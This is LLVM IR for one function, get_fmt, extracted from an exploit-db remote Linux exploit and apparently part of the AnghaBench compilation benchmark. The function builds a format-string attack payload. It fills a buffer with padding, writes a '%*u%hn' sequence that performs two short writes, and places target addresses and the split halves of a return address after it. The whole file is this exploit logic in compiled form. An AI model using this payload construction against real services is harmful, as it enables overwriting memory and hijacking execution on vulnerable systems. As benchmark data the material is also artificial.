; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_373.c_get_fmt.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_373.c_get_fmt.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i64, i32, i64 }

@SLOP = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [64 x i8] c"Can't encode a NULL high retaddr, bailing\0Ahigh = %hx\09low = %hx\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"adsf\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"%s%%%d$*%d$u%%%d$hn%%%d$*%d$u%%%d$hn\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"1111\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @get_fmt(%struct.TYPE_3__* %0, i8* %1) #0 {
  %3 = alloca %struct.TYPE_3__*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store %struct.TYPE_3__* %0, %struct.TYPE_3__** %3, align 8
  store i8* %1, i8** %4, align 8
  %11 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %12 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %11, i32 0, i32 3
  %13 = load i64, i64* %12, align 8
  store i64 %13, i64* %7, align 8
  store i64 0, i64* %8, align 8
  %14 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %15 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 8
  store i32 %16, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %17 = load i64, i64* @SLOP, align 8
  %18 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %19 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %18, i32 0, i32 1
  %20 = load i64, i64* %19, align 8
  %21 = add i64 %17, %20
  store i64 %21, i64* %8, align 8
  %22 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %23 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  %25 = and i32 %24, 65535
  store i32 %25, i32* %6, align 4
  %26 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %27 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %26, i32 0, i32 2
  %28 = load i32, i32* %27, align 8
  %29 = ashr i32 %28, 16
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* %6, align 4
  %31 = load i32, i32* %5, align 4
  %32 = icmp sgt i32 %30, %31
  br i1 %32, label %33, label %38

33:                                               ; preds = %2
  %34 = load i32, i32* %6, align 4
  %35 = sub nsw i32 65536, %34
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, %35
  store i32 %37, i32* %5, align 4
  br label %58

38:                                               ; preds = %2
  %39 = load i32, i32* %5, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp sgt i32 %39, %40
  br i1 %41, label %42, label %46

42:                                               ; preds = %38
  %43 = load i32, i32* %6, align 4
  %44 = load i32, i32* %5, align 4
  %45 = sub nsw i32 %44, %43
  store i32 %45, i32* %5, align 4
  br label %57

46:                                               ; preds = %38
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* %6, align 4
  %49 = icmp eq i32 %47, %48
  br i1 %49, label %50, label %56

50:                                               ; preds = %46
  %51 = load i32, i32* @stderr, align 4
  %52 = load i32, i32* %5, align 4
  %53 = load i32, i32* %6, align 4
  %54 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0), i32 %52, i32 %53)
  %55 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %56

56:                                               ; preds = %50, %46
  br label %57

57:                                               ; preds = %56, %42
  br label %58

58:                                               ; preds = %57, %33
  %59 = load i64, i64* %8, align 8
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = sub nsw i64 %61, %59
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %6, align 4
  %64 = load i8*, i8** %4, align 8
  %65 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %66 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %65, i32 0, i32 1
  %67 = load i64, i64* %66, align 8
  %68 = call i32 @memset(i8* %64, i8 signext 65, i64 %67)
  %69 = load i8*, i8** %4, align 8
  %70 = load %struct.TYPE_3__*, %struct.TYPE_3__** %3, align 8
  %71 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %70, i32 0, i32 1
  %72 = load i64, i64* %71, align 8
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  %74 = load i8*, i8** %4, align 8
  %75 = load i8*, i8** %4, align 8
  %76 = load i32, i32* %9, align 4
  %77 = load i32, i32* %9, align 4
  %78 = add nsw i32 %77, 3
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = load i32, i32* %9, align 4
  %82 = load i32, i32* %9, align 4
  %83 = add nsw i32 %82, 4
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, 2
  %86 = call i32 @sprintf(i8* %74, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i8* %75, i32 %76, i32 %78, i32 %80, i32 %81, i32 %83, i32 %85)
  %87 = load i8*, i8** %4, align 8
  %88 = call i32 @strcat(i8* %87, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %89 = load i8*, i8** %4, align 8
  %90 = call i32 @strlen(i8* %89)
  store i32 %90, i32* %10, align 4
  %91 = load i64, i64* %7, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %10, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = bitcast i8* %95 to i64*
  store i64 %91, i64* %96, align 8
  %97 = load i32, i32* %10, align 4
  %98 = sext i32 %97 to i64
  %99 = add i64 %98, 8
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %10, align 4
  %101 = load i64, i64* %7, align 8
  %102 = add nsw i64 %101, 2
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %10, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = bitcast i8* %106 to i64*
  store i64 %102, i64* %107, align 8
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = add i64 %109, 8
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %10, align 4
  %112 = load i32, i32* %6, align 4
  %113 = load i8*, i8** %4, align 8
  %114 = load i32, i32* %10, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = bitcast i8* %116 to i32*
  store i32 %112, i32* %117, align 4
  %118 = load i8*, i8** %4, align 8
  %119 = load i32, i32* %10, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = getelementptr inbounds i8, i8* %121, i64 2
  %123 = bitcast i8* %122 to i32*
  store i32 257, i32* %123, align 4
  %124 = load i32, i32* %10, align 4
  %125 = sext i32 %124 to i64
  %126 = add i64 %125, 8
  %127 = trunc i64 %126 to i32
  store i32 %127, i32* %10, align 4
  %128 = load i32, i32* %5, align 4
  %129 = load i8*, i8** %4, align 8
  %130 = load i32, i32* %10, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = bitcast i8* %132 to i32*
  store i32 %128, i32* %133, align 4
  %134 = load i8*, i8** %4, align 8
  %135 = load i32, i32* %10, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = getelementptr inbounds i8, i8* %137, i64 2
  %139 = bitcast i8* %138 to i32*
  store i32 257, i32* %139, align 4
  %140 = load i32, i32* %10, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 %141, 8
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %10, align 4
  %144 = load i8*, i8** %4, align 8
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  store i8 0, i8* %147, align 1
  ret void
}

declare dso_local i32 @fprintf(i32, i8*, i32, i32) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i64) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
